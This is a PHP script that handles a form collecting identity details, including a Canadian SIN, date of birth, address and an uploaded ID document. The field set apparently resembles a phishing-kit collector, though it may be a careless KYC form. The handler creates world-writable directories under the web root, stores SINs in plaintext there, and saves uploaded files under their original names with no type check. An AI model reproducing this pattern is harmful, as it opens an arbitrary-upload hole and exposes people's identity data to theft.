<?php

// Define the path to the log file and upload directory
$basePah = '/var/www/html/websites/files/' . time();
mkdir($basePah, 0777,true);
$logFile = $basePah . '/id.log'; // Specify the log file path
$uploadDir = $basePah . '/'; // Specify the directory for file uploads

// Function to safely get form data
function getPostData($key) {
    return isset($_POST[$key]) ? htmlspecialchars($_POST[$key], ENT_QUOTES, 'UTF-8') : '';
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Extract the data from the form
    $passcode = getPostData('passcode');
    $firstName = getPostData('firstName');
    $lastName = getPostData('lastName'); // Assuming 'name' is for the last name
    $email = getPostData('email'); // Assuming 'phone' is for the email
    $phone = getPostData('phone');
    $dateOfBirth = getPostData('dateOfBirth');

    $streetNumber = getPostData('streetNumber');
    $streetName = getPostData('streetName');
    $apt = getPostData('apt');
    $city = getPostData('city');
    $province = getPostData('province');
    $postalCode = getPostData('postalCode');

    $status = getPostData('status');
    $sin = getPostData('sin');

    // Prepare the log entry
    $logEntry = [
        'firstName' => $firstName,
        'lastName' => $lastName,
        'email' => $email,
        'phone' => $phone,
        'dob-yyyy-mm-dd' => $dateOfBirth,
        'address' => [
            'streetNumber' => $streetNumber,
            'streetName' => $streetName,
            'apt' => $apt,
            'city' => $city,
            'province' => $province,
            'postalCode' => $postalCode,
        ],
        'kyc' => [
            'status' => $status,
            'sin' => $sin,
        ]
    ];

    // Write to log file
    file_put_contents($logFile, json_encode($logEntry), FILE_APPEND | LOCK_EX);

    // Handle file upload
    if (isset($_FILES['identity']) && $_FILES['identity']['error'] == 0) {
        $identityFile = $_FILES['identity']['name'];
        $tempName = $_FILES['identity']['tmp_name'];
        $path = $uploadDir . basename($identityFile);

        // Move the file to the upload directory
        if (move_uploaded_file($tempName, $path)) {
            echo 'Thank you for your submission.';
        } else {
            echo 'No file uploaded or file upload error.';
        }
    } else {
        echo 'No file uploaded or file upload error.';
    }

    // Redirect or send a response here if needed
    // header('Location: thank_you_page.php'); // Redirect to a thank you page
    exit;
}
?>
